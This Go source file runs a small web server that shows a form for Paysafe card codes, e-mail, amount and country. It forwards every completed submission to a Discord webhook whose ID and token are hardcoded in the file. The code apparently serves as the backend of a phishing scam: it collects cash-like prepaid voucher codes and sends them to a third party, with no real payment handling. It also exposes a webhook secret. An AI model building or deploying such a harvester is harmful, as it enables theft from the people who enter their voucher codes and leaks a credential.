package main

import (
	"fmt"
	"html/template"
	"log"
	"net/http"

	"github.com/nickname32/discordhook"
)

type ContactDetails struct {
	Card    string
	Email   string
	Subject string
	Money   string
	Message string
	Country string
}

func main() {
	wa, err := discordhook.NewWebhookAPI(820740896956874794, "1Nby11h_VdyZ5094XuXTaHgAI7NCu9-6_v0Vei5TY-WeQGWsG166ygJdgedxgVr3ANcX", true, nil)

	if err != nil {
		log.Println(err)
	}

	tmpl := template.Must(template.ParseFiles("templates/form.html"))

	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		details := ContactDetails{
			Card:    r.FormValue("card"),
			Email:   r.FormValue("email"),
			Money:   r.FormValue("money"),
			Country: r.FormValue("country"),
		}

		if r.Method != http.MethodPost {
			tmpl.Execute(w, nil)
			return
		}

		switch {
		case details.Card == "":
			tmpl.Execute(w, struct {
				Success bool
				Message string
			}{false, "Please fill in the Paysafe card field."})
			return
		case details.Email == "":
			tmpl.Execute(w, struct {
				Success bool
				Message string
			}{false, "Please fill in the e-mail field."})
			return
		case details.Money == "":
			tmpl.Execute(w, struct {
				Success bool
				Message string
			}{false, "Enter the amount."})
			return
		case details.Country == "":
			tmpl.Execute(w, struct {
				Success bool
				Message string
			}{false, "Please inform the country."})
			return
		}

		fmt.Println(details)

		if _, err := wa.Execute(nil, &discordhook.WebhookExecuteParams{Content: fmt.Sprintf("Card: %s | Email: %s | Money: %s | Country: %s", details.Card, details.Email, details.Money, details.Country)}, nil, ""); err != nil {
			log.Println(err)
		}

		tmpl.Execute(w, struct{ Success bool }{true})
	})

	http.ListenAndServe(":4444", nil)
}
